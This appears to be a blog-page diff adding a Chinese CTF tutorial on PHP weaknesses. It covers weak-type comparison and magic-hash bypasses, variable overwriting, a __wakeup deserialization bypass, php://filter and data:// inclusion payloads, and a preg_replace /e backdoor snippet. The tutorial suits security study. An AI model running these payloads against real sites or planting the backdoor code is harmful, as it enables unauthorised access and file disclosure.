@@ -132,7 +132,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-count">59</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -176,6 +176,185 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/07/PHP/%E7%9B%AE%E5%89%8Dctf%E7%9A%84php%E7%AE%80%E5%8D%95%E7%9F%A5%E8%AF%86%E7%82%B9(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/07/PHP/%E7%9B%AE%E5%89%8Dctf%E7%9A%84php%E7%AE%80%E5%8D%95%E7%9F%A5%E8%AF%86%E7%82%B9(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/" class="post-title-link" itemprop="url">目前ctf的php简单知识点(持续更新)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-07 21:39:48" itemprop="dateCreated datePublished" datetime="2022-04-07T21:39:48+08:00">2022-04-07</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-04-08 16:15:06" itemprop="dateModified" datetime="2022-04-08T16:15:06+08:00">2022-04-08</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_POST // 获取 post 数据，是一个字典</span><br><span class="line">$_GET // 获取 get 数据，是一个字典</span><br><span class="line">$_COOKIE // 获取 cookie</span><br><span class="line">$_SESSION // 获取 session</span><br><span class="line">$_FILE // 获取上传的文件</span><br><span class="line">$_REQUEST // 获取 $_GET，$_POST，$_COOKIE 中的数据</span><br></pre></td></tr></table></figure>
+<h2 id="错误控制运算符"><a href="#错误控制运算符" class="headerlink" title="错误控制运算符"></a>错误控制运算符</h2><p>PHP 支持一个错误控制运算符：@。当将其放置在一个PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</p>
+<h2 id="变量默认值"><a href="#变量默认值" class="headerlink" title="变量默认值"></a>变量默认值</h2><p>当定义一个变量，如果没有设置值，默认为0</p>
+<h2 id="GET-和-POST"><a href="#GET-和-POST" class="headerlink" title="$_GET 和 $_POST"></a>$_GET 和 $_POST</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf4.shiyanbar.com/web/false.php?name[]=a&amp;password[]=b</span><br></pre></td></tr></table></figure>
+<p>如果 GET 参数中设置 <code>name[]=a</code>，那么 <code>$_GET[&#39;name&#39;] = [a]</code>，php 会把 <code>[]=a</code> 当成数组传入， <code>$_GET</code> 会自动对参数调用 <code>urldecode</code>。<br><code>$_POST</code> 同样存在此漏洞，提交的表单数据，<code>user[]=admin</code>，<code>$_POST[&#39;user&#39;]</code> 得到的是 <code>[&#39;admin&#39;]</code> 是一个数组。</p>
+<h2 id="内置函数的松散性"><a href="#内置函数的松散性" class="headerlink" title="内置函数的松散性"></a>内置函数的松散性</h2><p>strcmp</p>
+<p>strcmp 函数的输出含义如下:</p>
+<blockquote>
+<p>如果 str1 小于 str2 返回 &lt; 0；<br>如果 str1 大于 str2 返回 &gt; 0；<br>如果两者相等，返回 0。<br>5.2 中是将两个参数先转换成string类型。5.3.3 以后，当比较数组和字符串的时候，返回是0。5.5 中如果参数不是string类型，直接return了</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$array=[1, 2, 3];</span><br><span class="line">// 数组跟字符串比较会返回 0</span><br><span class="line">//这里会输出 null，在某种意义上 null 也就是相当于 false，也就是判断为相等</span><br><span class="line">var_dump(strcmp($array, &#x27;abc&#x27;)); </span><br></pre></td></tr></table></figure>
+<p>sha1 和 md5 函数<br>md5 和 sha1 无法处理数组，但是 php 没有抛出异常，直接返回 fasle</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sha1([]) === false</span><br><span class="line">md5([]) === false</span><br></pre></td></tr></table></figure>
+<p>弱类型<br>当一个整形和一个其他类型行比较的时候，会先把其他类型 <code>intval</code> 再比较</p>
+<p>intval</p>
+<p>intval() 在转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval() 不会报错而是返回 0。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(intval(&#x27;2&#x27;)) // 2</span><br><span class="line">var_dump(intval(&#x27;3abcd&#x27;)) // 3 </span><br><span class="line">var_dump(intval(&#x27;abcd&#x27;)) // 0 </span><br></pre></td></tr></table></figure>
+<p>这个时候 <code>$a</code> 的值有可能是 <code>1002 union…</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(intval($a) &gt; 1000) &#123; </span><br><span class="line">    mysql_query(&quot;select * from news where id=&quot;.$a) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>is_numeric<br>PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo is_numeric(233333);       // 1</span><br><span class="line">echo is_numeric(&#x27;233333&#x27;);    // 1</span><br><span class="line">echo is_numeric(0x233333);    // 1</span><br><span class="line">echo is_numeric(&#x27;0x233333&#x27;);   // 1</span><br><span class="line">echo is_numeric(&#x27;233333abc&#x27;);  // 0</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>in_array<br>in_array函数用来判断一个值是否在某一个数组列表里面，通常判断方式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(&#x27;b&#x27;, array(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;);</span><br></pre></td></tr></table></figure>
+<p>这段代码的作用是过滤 GET 参数 typeid 在不在 1，2，3，4 这个数组里面。但是，in_array 函数存在自动类型转换。如果请求，<code>typeid=1’ union select..</code> 也能通过 in_array 的验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (in_array($_GET(&#x27;typeid&#x27;], array(1, 2, 3, 4))) &#123;</span><br><span class="line">    $sql=&quot;select …. where typeid=&quot;.$_GET[&#x27;typeid&#x27;]&quot;;</span><br><span class="line">    echo $sql;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>== 和 ===<br><code>==</code> 是弱类型的比较<code>===</code> 比较符则可以避免这种隐式转换，除了检查值还检查类型。</p>
+<p>以下比较的结果都为 true</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc</span><br><span class="line">// 十六进制与整数，被转换为同一进制比较</span><br><span class="line">&#x27;0xccccccccc&#x27; == &#x27;54975581388&#x27; </span><br><span class="line"></span><br><span class="line">// 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0</span><br><span class="line">1 == &#x27;1&#x27;</span><br><span class="line">1 == &#x27;01&#x27;</span><br><span class="line">10 == &#x27;1e1&#x27;</span><br><span class="line">100 == &#x27;1e2&#x27; </span><br><span class="line">0 == &#x27;a&#x27; // a 转换为数字为 0</span><br><span class="line"></span><br><span class="line">// 十六进制数与带空格十六进制数，被转换为十六进制整数</span><br><span class="line">&#x27;0xABCdef&#x27; == &#x27;     0xABCdef&#x27;</span><br><span class="line">&#x27;0010e2&#x27; == &#x27;1e3&#x27;</span><br></pre></td></tr></table></figure>
+<p>hash 比较的问题<br>0e 开头且后面都是数字会被当作科学计数法，也就是等于 0*10^xxx=0。如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// &#x27;0e5093234&#x27; 为 0，&#x27;0eabc3234&#x27; 不为 0</span><br><span class="line"></span><br><span class="line">// true</span><br><span class="line">&#x27;0e509367213418206700842008763514&#x27; == &#x27;0e481036490867661113260034900752&#x27;</span><br><span class="line">// true</span><br><span class="line">&#x27;0e481036490867661113260034900752&#x27; == &#x27;0&#x27; </span><br><span class="line"></span><br><span class="line">// false</span><br><span class="line">var_dump(&#x27;0&#x27; == &#x27;0e1abcd&#x27;);</span><br><span class="line">// true</span><br><span class="line">var_dump(0 == &#x27;0e1abcd&#x27;);</span><br><span class="line"></span><br><span class="line">var_dump(md5(&#x27;240610708&#x27;) == md5(&#x27;QNKCDZO&#x27;));</span><br><span class="line">var_dump(md5(&#x27;aabg7XSs&#x27;) == md5(&#x27;aabC9RqS&#x27;));</span><br><span class="line">var_dump(sha1(&#x27;aaroZmOk&#x27;) == sha1(&#x27;aaK1STfY&#x27;));</span><br><span class="line">var_dump(sha1(&#x27;aaO8zKZF&#x27;) == sha1(&#x27;aa3OFF9m&#x27;));</span><br></pre></td></tr></table></figure>
+<p>如果要找出 <code>0e</code> 开头的 hash 碰撞，可以用如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$salt = &#x27;vunp&#x27;;</span><br><span class="line">$hash = &#x27;0e612198634316944013585621061115&#x27;;</span><br><span class="line"></span><br><span class="line">for ($i=1; $i&lt;100000000000; $i++) &#123;</span><br><span class="line">    if (md5($salt . $i) == $hash) &#123;</span><br><span class="line">        echo $i;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &#x27;done&#x27;;</span><br></pre></td></tr></table></figure>
+<p>switch<br>如果 switch 是数字类型的 case 的判断时， switch 会将其中的参数转换为 int 类型。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$i =&quot;2abc&quot;;</span><br><span class="line">switch ($i)  &#123;</span><br><span class="line">    case 0:</span><br><span class="line">    case 1:</span><br><span class="line">    case 2:</span><br><span class="line">        echo &quot;i is less than 3 but not negative&quot;;</span><br><span class="line">        break;</span><br><span class="line">    case 3:</span><br><span class="line">        echo &quot;i is 3&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个时候程序输出的是 i is less than 3 but not negative，是由于 switch() 函数将 <code>$i</code> 进行了类型转换，转换结果为 2。</p>
+<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>preg_match</p>
+<p>如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(<code>^</code> 和 <code>$</code>)，则可以存在绕过的问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ip = &#x27;1.1.1.1 abcd&#x27;; // 可以绕过</span><br><span class="line">if(!preg_match(&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;,$ip)) &#123;</span><br><span class="line">  die(&#x27;error&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  // echo(&#x27;key...&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ereg %00 截断<br>ereg 读到 %00 的时候，就截止了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;a&#x27;]) === FALSE)  &#123;</span><br><span class="line">        echo &#x27;You password must be alphabet&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里 <code>a=abcd%001234</code>，可以绕过</p>
+<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>extract</p>
+<p>extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    $auth = &#x27;0&#x27;;  </span><br><span class="line">    // 这里可以覆盖$auth的变量值</span><br><span class="line">    extract($_GET); </span><br><span class="line">    if($auth == 1)&#123;  </span><br><span class="line">        echo &quot;private!&quot;;  </span><br><span class="line">    &#125; else&#123;  </span><br><span class="line">        echo &quot;public!&quot;;  </span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+<p>parse_str<br>parse_str() 的作用是解析字符串，并注册成变量。与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//var.php?var=new  </span><br><span class="line">$var=&#x27;init&#x27;;  </span><br><span class="line">parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">// $var 会变成 new</span><br><span class="line">echo $var;</span><br></pre></td></tr></table></figure>
+<p>$$ 变量覆盖<br>如果把变量本身的 key 也当变量，也就是使用了 <code>$$</code>，就可能存在问题。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_ = &#x27;_POST&#x27;;</span><br><span class="line">// $$_ 是等于 $_POST </span><br></pre></td></tr></table></figure>
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// http://127.0.0.1/index.php?_CONFIG=123</span><br><span class="line">$_CONFIG[&#x27;extraSecure&#x27;] = true;</span><br><span class="line"></span><br><span class="line">foreach(array(&#x27;_GET&#x27;,&#x27;_POST&#x27;) as $method) &#123;</span><br><span class="line">    foreach($$method as $key=&gt;$value) &#123;</span><br><span class="line">      // $key == _CONFIG</span><br><span class="line">      // $$key == $_CONFIG</span><br><span class="line">      // 这个函数会把 $_CONFIG 变量销毁</span><br><span class="line">      unset($$key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_CONFIG[&#x27;extraSecure&#x27;] == false) &#123;</span><br><span class="line">    echo &#x27;flag &#123;****&#125;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>unset<br><code>unset($bar);</code> 用来销毁指定的变量，如果变量 <code>$bar</code> 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过。</p>
+<h2 id="特殊的-PHP-代码格式"><a href="#特殊的-PHP-代码格式" class="headerlink" title="特殊的 PHP 代码格式"></a>特殊的 PHP 代码格式</h2><p>以这种后缀结尾的 php 文件也能被解析，这是在 fast-cgi 里面配置的</p>
+<p>.php2.php3.php4.php5.php7.phtml</p>
+<p>正则检测文件内容中包含 <code>&lt;?</code> 就异常退出，通常的PHP代码就不行了，可以使用这种方式绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">echo base64_encode(file_get_contents(&#x27;flag.php&#x27;));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>效果等于 echo ‘a’;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=&#x27;a&#x27;;?&gt;</span><br></pre></td></tr></table></figure>
+<p>如果在 php.ini 文件中配置允许 ASP 风格的标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; Allow ASP-style &lt;% %&gt; tags.</span><br><span class="line">; http://php.net/asp-tags</span><br><span class="line">asp_tags = On</span><br></pre></td></tr></table></figure>
+<p>则可以使用该方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% echo &#x27;a&#x27;; %&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><p>mt_rand()</p>
+<p>mt_rand() 函数是一个伪随机发生器，即如果知道随机数种子是可以预测的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$seed = 12345;</span><br><span class="line">mt_rand($seed);</span><br><span class="line"></span><br><span class="line">$ss = mt_rand();</span><br></pre></td></tr></table></figure>
+<p>linux 64 位系统中，rand() 和 mt_rand() 产生的最大随机数都是2147483647，正好是 2^31-1，也就是说随机播种的种子也是在这个范围中的，0 – 2147483647 的这个范围是可以爆破的。<br>但是用 php 爆破比较慢，有一个 C 的版本，可以根据随机数，爆破出种子 <a href="https://link.zhihu.com/?target=http://www.openwall.com/php_mt_seed/">php_mt_seed</a>。</p>
+<p>在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。</p>
+<p>rand()</p>
+<p>rand() 函数在产生随机数的时候没有调用 srand()，则产生的随机数是有规律可询的。具体的说明请看<a href="https://link.zhihu.com/?target=http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/">这里</a>。产生的随机数可以用下面这个公式预测:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 一般预测值可能比实际值要差1</span><br><span class="line">state[i] = state[i-3] + state[i-31]</span><br></pre></td></tr></table></figure>
+<p>可以用下面的代码验证一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$randStr = array(); </span><br><span class="line">for($i=0;$i&lt;50;$i++) &#123;  //先产生 32个随机数 </span><br><span class="line">    $randStr[$i]=rand(0,30); </span><br><span class="line">    if($i&gt;=31) &#123; </span><br><span class="line">        echo  &quot;$randStr[$i]=(&quot;.$randStr[$i-31].&quot;+&quot;.$randStr[$i-3].&quot;) mod 31&quot;.&quot;\n&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。__destruct()：析构函数，当对象被销毁时会自动调用。__wakeup() ：如前所提，unserialize()时会自动调用。</p>
+<p>PHP <code>unserialize()</code> 后会导致 <code>__wakeup()</code> 或 <code>__destruct()</code> 的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在 <code>__wakeup()</code> 或 <code>__destruct()</code> 中。</p>
+<p><code>__wakeup</code> 函数绕过</p>
+<p>PHP 有个 <a href="https://link.zhihu.com/?target=https://bugs.php.net/bug.php?id=72663">Bug</a>，如果反序列化出现问题，会不去执行 <code>__wakeup</code> 函数，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class xctf</span><br><span class="line">&#123;</span><br><span class="line">    public $flag = &quot;111&quot;;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        exit(&#x27;bad requests&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//echo serialize(new xctf());</span><br><span class="line">echo unserialize($_GET[&#x27;code&#x27;]);</span><br><span class="line">echo &quot;flag&#123;****&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>使用这个 payload 绕过 <code>__wakeup</code> 函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">http://www.example.com/index.php?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>在字符串中，前面的数字代表的是后面字符串中字符的个数，如果数字与字符个数不匹配的话，就会报错，因此将1改成2就会产生报错，导致不会去执行 <code>__wakeup</code> 函数，从而绕过该函数。</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.1.1:20770/index.php?page=upload</span><br></pre></td></tr></table></figure>
+<p>这种 url 很容易就能想到可能是文件包含或者伪协议读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.1.1:20770/index.php?page=php://filter/read=convert.base64-encode/resource=upload</span><br></pre></td></tr></table></figure>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>反引号 `</p>
+<p>反引号 ` 可以调用 shell_exec 正常执行代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$_GET[&#x27;v&#x27;]` 相当于 shell_exec($_GET[&#x27;v&#x27;])</span><br></pre></td></tr></table></figure>
+<p>preg_replace()<br>触发条件：</p>
+<p>第一个参数需要e标识符，有了它可以执行第二个参数的命令第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 这样是可以执行命令的</span><br><span class="line">echo preg_replace(&#x27;/test/e&#x27;, &#x27;phpinfo()&#x27;, &#x27;just test&#x27;);</span><br><span class="line"></span><br><span class="line">// 这种没有匹配上，所以返回值是第三个参数，不会执行命令</span><br><span class="line">echo preg_replace(&#x27;/test/e&#x27;, &#x27;phpinfo()&#x27;, &#x27;just tesxt&#x27;); </span><br></pre></td></tr></table></figure>
+<p>我们可以构造这样的后门代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@preg_replace(&quot;//e&quot;, $_GET[&#x27;h&#x27;], &quot;Access Denied&quot;);  </span><br><span class="line">echo preg_replace(&quot;/test/e&quot;, $_GET[&quot;h&quot;], &quot;jutst test&quot;); </span><br></pre></td></tr></table></figure>
+<p>当访问这样这样的链接时就可以被触发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8000/testbug.php?h=phpinfo();</span><br></pre></td></tr></table></figure>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/lfi.php?file=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">/lfi.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>写入文件， 数据利用 POST 传过去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php?file=php://input</span><br></pre></td></tr></table></figure>
+<h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><p>将 include 的文件流重定向到用户控制的输入流</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==</span><br></pre></td></tr></table></figure>
+<p>可以用于控制 file_get_contents 的内容为用户输入的流</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$data = @file_get_contents($a,&#x27;r&#x27;);</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure>
+<h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>发现有一个文件上传功能，无法绕过，仅能上传jpg后缀的文件。与此同时，无法进行文件包含截断。allow_url_include=on 的状态下，就可以考虑phar伪协议绕过。</p>
